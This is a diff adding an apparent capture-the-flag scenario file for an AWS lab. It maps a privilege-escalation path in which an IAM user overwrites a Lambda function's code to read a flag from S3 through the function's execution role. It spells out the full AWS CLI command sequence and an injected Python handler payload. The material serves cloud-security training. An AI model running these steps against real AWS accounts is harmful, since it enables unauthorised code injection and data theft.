@@ -1,0 +1,130 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-004-to-bucket-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has lambda:UpdateFunctionCode and lambda:InvokeFunction permissions
+        on the target Lambda function, which executes with a role that has S3 read access
+        to the target bucket.
+
+    - id: target-lambda
+      label: "Target Lambda"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-004-to-bucket-target-lambda"
+      description: >
+        This Lambda function currently runs benign code. Its execution role has s3:GetObject
+        and s3:ListBucket on the target S3 bucket. By fetching the existing code, appending
+        a payload that reads flag.txt from S3 and returns it in the response, and immediately
+        invoking the function, the attacker can retrieve the flag without ever holding S3
+        permissions themselves.
+
+    - id: target-role
+      label: "Bucket Access Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-004-to-bucket-target-role"
+      description: >
+        This IAM role is the Lambda execution role. It has s3:GetObject and s3:ListBucket
+        scoped to the target S3 bucket. When the malicious code runs inside the Lambda
+        runtime, it operates as this role and can read any object from that bucket —
+        including the CTF flag stored as flag.txt.
+
+    - id: target-bucket
+      label: "Target S3 Bucket"
+      type: resource
+      subType: s3-bucket
+      isTarget: true
+      arn: "arn:aws:s3:::pl-prod-lambda-004-to-bucket-{account_id}-{suffix}"
+      description: >
+        The target S3 bucket containing the CTF flag for this scenario. The flag is stored
+        as flag.txt at the bucket root. Direct S3 access from the starting user is denied —
+        the only way to reach it is through the Lambda execution role, which you control
+        by modifying the function's code.
+
+  edges:
+    - from: starting-principal
+      to: target-lambda
+      label: "lambda:UpdateFunctionCode"
+      description: >
+        Fetch the existing Lambda function code and handler configuration, then append a
+        payload that reads flag.txt from the target S3 bucket and returns it in the
+        response body. Redeploy the modified zip with lambda:UpdateFunctionCode, then
+        invoke it with lambda:InvokeFunction to execute the payload under the execution role.
+      hints:
+        - "Fetch the existing function config with lambda:GetFunction to confirm the Handler field, then append your s3:GetObject call to the handler. The handler filename must match the existing Handler field exactly or the invocation will fail. Download the existing code zip from the PresignedURL in the GetFunction response, extract it, add your payload, and repackage it — this preserves any existing dependencies."
+        - "Deploy the modified zip with lambda:UpdateFunctionCode using the fileb:// prefix, then invoke with lambda:InvokeFunction using an empty payload. Lambda returns HTTP 200 even when the handler throws an exception — always check the response body for errors. The flag returned in the response body is the value you need."
+        - "Browse to https://pathfinding.cloud/paths/lambda-004 for technique details."
+      commands:
+        - description: "List Lambda functions to find targets"
+          command: "aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table"
+        - description: "Get current function details (handler name and execution role)"
+          command: "aws lambda get-function --function-name pl-prod-lambda-004-to-bucket-target-lambda"
+        - description: "Download existing function code to preserve and extend"
+          command: |
+            PRESIGNED_URL=$(aws lambda get-function --function-name pl-prod-lambda-004-to-bucket-target-lambda --query 'Code.Location' --output text)
+            curl -s -o /tmp/original_function.zip "$PRESIGNED_URL"
+            mkdir -p /tmp/lambda_work && cd /tmp/lambda_work && unzip -o /tmp/original_function.zip
+        - description: "Append S3 read payload to the existing handler"
+          command: |
+            cat >> /tmp/lambda_work/lambda_function.py << 'EOF'
+
+            def _read_flag(bucket_name):
+                import boto3
+                s3 = boto3.client('s3')
+                obj = s3.get_object(Bucket=bucket_name, Key='flag.txt')
+                return obj['Body'].read().decode('utf-8')
+
+            _original_handler = lambda_handler
+
+            def lambda_handler(event, context):
+                import boto3
+                s3 = boto3.client('s3')
+                buckets = s3.list_buckets()['Buckets']
+                target = [b['Name'] for b in buckets if 'lambda-004-to-bucket' in b['Name']][0]
+                flag = _read_flag(target)
+                return {'statusCode': 200, 'body': flag}
+            EOF
+        - description: "Repackage the modified code"
+          command: "cd /tmp/lambda_work && zip -r /tmp/modified_function.zip . && cd -"
+        - description: "Update the Lambda function code with the modified payload"
+          command: "aws lambda update-function-code --function-name pl-prod-lambda-004-to-bucket-target-lambda --zip-file fileb:///tmp/modified_function.zip"
+
+    - from: target-lambda
+      to: target-role
+      label: "lambda:InvokeFunction"
+      description: >
+        Invoke the Lambda function to execute the modified payload under the target execution
+        role. The function reads flag.txt from the S3 bucket using its s3:GetObject permission
+        and returns the contents in the response body.
+      hints: []
+      commands:
+        - description: "Invoke the Lambda function to execute the payload"
+          command: "aws lambda invoke --function-name pl-prod-lambda-004-to-bucket-target-lambda --payload '{}' /tmp/response.json && cat /tmp/response.json"
+
+    - from: target-role
+      to: target-bucket
+      label: "s3:GetObject (via Lambda role)"
+      description: >
+        The Lambda execution role reads flag.txt from the target S3 bucket and returns its
+        contents in the invocation response. Retrieve the flag from the response body captured
+        in the previous step.
+      hints:
+        - "The flag is in the Lambda invocation response body — parse it from the JSON output written to /tmp/response.json. Alternatively, if you have the bucket name, you can read flag.txt directly with aws s3 cp."
+      commands:
+        - description: "Extract the flag from the Lambda response"
+          command: "cat /tmp/response.json | python3 -c \"import sys,json; r=json.load(sys.stdin); print(r.get('body', r))\""
+        - description: "Alternatively, read flag.txt directly from S3 using the bucket name"
+          command: "aws s3 cp s3://pl-prod-lambda-004-to-bucket-{account_id}-{suffix}/flag.txt -"
